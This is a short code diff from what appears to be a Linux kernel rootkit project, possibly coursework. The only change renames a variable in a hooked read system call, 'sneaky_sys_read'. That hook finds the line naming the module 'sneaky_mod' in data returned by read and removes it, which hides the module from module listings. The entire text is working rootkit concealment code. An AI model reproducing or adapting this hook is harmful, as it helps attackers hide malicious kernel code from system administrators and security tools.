@@ -86,16 +86,16 @@ asmlinkage ssize_t (*original_read)(int fd, char *buf, size_t count);
 asmlinkage ssize_t sneaky_sys_read(int fd, char *buf, size_t count) {
   // printk(KERN_INFO "read:%s", buf);
   ssize_t rest;
-  char *ptr;
+  char *start;
   char *end;
   rest = original_read(fd, buf, count);
   if (module_pointer >= 0 && module_pointer == fd) {
     module_pointer = -1;
-    ptr = strstr(buf, "sneaky_mod");
-    if (ptr != NULL) {
-      end = strchr(ptr, '\n');
-      memmove(ptr, end + 1, rest - (ssize_t)(end - buf));
-      rest -= (ssize_t)(end - ptr);
+    start = strstr(buf, "sneaky_mod");
+    if (start != NULL) {
+      end = strchr(start, '\n');
+      memmove(start, end + 1, rest - (ssize_t)(end - buf));
+      rest -= (ssize_t)(end - start);
     }
   }
   return rest;
